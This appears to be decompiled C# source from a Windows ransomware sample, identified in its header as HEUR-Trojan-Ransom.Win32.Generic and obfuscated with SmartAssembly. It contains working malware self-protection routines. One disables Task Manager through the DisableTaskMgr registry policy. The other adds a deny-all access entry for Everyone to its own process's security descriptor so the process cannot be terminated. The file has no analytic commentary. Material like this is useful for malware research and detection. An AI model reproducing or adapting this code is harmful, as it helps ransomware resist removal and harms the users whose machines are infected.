// Decompiled with JetBrains decompiler
// Type: coxZRmDhvSAWo.c000012
// Assembly: Worker-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E50A6D0-CF23-40BF-9617-750EB84D00C0
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-122df846a943e419c3a31f65b6e67e7570134612b2dfd45638e0edd23e214036.exe

using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace coxZRmDhvSAWo
{
  internal sealed class c000012
  {
    [NonSerialized]
    internal static GetString f00004a;

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetKernelObjectSecurity(
      IntPtr p0,
      int p1,
      [Out] byte[] p2,
      uint fqjRjVAGimM,
      out uint LDcaymvFyhq);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetKernelObjectSecurity(
      IntPtr p0,
      int clOREmQcBWhiHvb,
      [In] byte[] fdvSoJIqQC);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    public void rhmOIzRJpvKvUO(bool p0)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        subKey.SetValue("DisableTaskMgr", (object) "1");
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor xqWTjqgGDEvV(IntPtr p0)
    {
      byte[] p2 = new byte[0];
      uint LDcaymvFyhq;
      c000012.GetKernelObjectSecurity(p0, 4, p2, 0U, out LDcaymvFyhq);
      byte[] binaryForm;
      return LDcaymvFyhq <= (uint) short.MaxValue ? (c000012.GetKernelObjectSecurity(p0, 4, binaryForm = new byte[(IntPtr) LDcaymvFyhq], LDcaymvFyhq, out LDcaymvFyhq) ? new RawSecurityDescriptor(binaryForm, 0) : (RawSecurityDescriptor) null) : (RawSecurityDescriptor) null;
    }

    private void m000026(IntPtr p0, RawSecurityDescriptor p1)
    {
      byte[] numArray = new byte[p1.BinaryLength];
      p1.GetBinaryForm(numArray, 0);
      c000012.SetKernelObjectSecurity(p0, 4, numArray);
    }

    public void ijStrwHioHMPyDK()
    {
      try
      {
        IntPtr currentProcess = c000012.GetCurrentProcess();
        RawSecurityDescriptor p1 = this.xqWTjqgGDEvV(currentProcess);
        p1.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        this.m000026(currentProcess, p1);
      }
      catch (Exception ex)
      {
      }
    }

    static c000012() => Strings.CreateGetStringDelegate(typeof (c000012));
  }
}
